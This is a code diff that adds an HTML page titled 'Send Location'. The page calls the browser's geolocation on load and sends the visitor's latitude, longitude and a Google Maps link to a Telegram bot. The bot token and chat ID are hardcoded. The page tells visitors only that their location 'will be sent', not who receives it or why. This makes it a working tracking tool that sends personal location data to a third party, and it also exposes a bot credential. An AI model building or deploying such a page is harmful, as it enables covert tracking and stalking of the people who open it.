@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Send Location</title>
+    <script>
+        const BOT_TOKEN = "7772260536:AAF1fQtBRxKGmjpnoMYRxQcpRpyu8TixtO4";
+        const CHAT_ID = "7153864821";
+
+        // Automatically request user's location
+        function requestLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, showError);
+            } else {
+                alert("Geolocation is not supported by your browser.");
+            }
+        }
+
+        // Send location to Telegram
+        function sendLocation(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            // Telegram API URL
+            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+            // Message to send
+            const message = `User's Location:\nLatitude: ${latitude}\nLongitude: ${longitude}\nGoogle Maps: https://www.google.com/maps?q=${latitude},${longitude}`;
+
+            // Send the message
+            fetch(telegramUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            }).catch(() => {
+                console.error("Failed to send location to Telegram.");
+            });
+        }
+
+        // Handle location errors
+        function showError(error) {
+            console.error("Error retrieving location:", error);
+        }
+
+        // Automatically trigger location request on page load
+        window.onload = requestLocation;
+    </script>
+</head>
+<body>
+    <h1>Getting Your Location...</h1>
+    <p>Your location will be sent automatically if you allow location access.</p>
+</body>
+</html>
